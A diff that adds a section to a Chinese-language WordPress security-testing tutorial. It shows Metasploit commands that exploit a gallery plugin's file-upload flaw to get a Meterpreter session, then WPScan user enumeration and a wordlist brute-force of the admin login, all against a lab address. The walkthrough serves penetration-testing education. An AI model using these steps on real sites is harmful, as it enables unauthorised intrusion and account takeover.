@@ -75,3 +75,62 @@ wpscan --url https://www.xxxxxx.wiki --enumerate vt
 wpscan -u https://www.xxxxxx.wiki/ -enumerate tt
 ```
 
+^
+
+
+## 结合Metasploit利用插件中的漏洞
+
+接下来，我们将用第一个插件中的任意文件上传漏洞来进行漏洞利用演示，该漏洞允许我们上传恶意文件并实现远程代码执行。
+
+打开终端窗口并输入下列命令：
+
+```
+useexploit/unix/webapp/wp_reflexgallery_file_upload
+msfexploit(wp_reflexgallery_file_upload) > set rhost 192.168.0.101
+msfexploit(wp_reflexgallery_file_upload) > set targetURI /wordpress/
+msfexploit(wp_reflexgallery_file_upload) > exploit
+```
+
+你将看到终端与目标设备建立了Meterpreter会话，你可以输入下列命令查看目标系统信息：
+
+```
+Sysinfo
+```
+
+![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287971789768.png!small)
+
+## 枚举WordPress用户名
+
+我们可以在终端中输入下列命令来枚举WordPress用户名：
+
+```
+./wpscan.rb -u http://192.168.0.101/wordpress/ --enumerate u
+```
+
+![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972068549.png!small)
+
+接下来工具将导出用户名数据表，你可以看到用户名以及对应的ID信息。
+
+当然了，你也可以使用下列命令枚举出所有的内容：
+
+```
+./wpscan.rb -u http://192.168.0.101/wordpress/ -e at -e ap -e u
+–e at : enumerate all themes of targeted website
+–e ap: enumerate all plugins of targeted website
+–e u: enumerate all usernames of targeted website
+```
+
+![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972309586.png!small)
+
+## 使用WPScan进行暴力破解
+
+在进行暴力破解攻击之前，我们需要创建对应的字典文件。输入下列命令：
+
+```
+./wpscan.rb –u http://192.168.0.101/wordpress/ --wordlist /root/Desktop/dict.txt --usernameadmin
+```
+
+![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/1528797258105.png!small)
+
+如果找到了相匹配的用户名与密码，工具将直接以admin:password的形式显示出来：
+
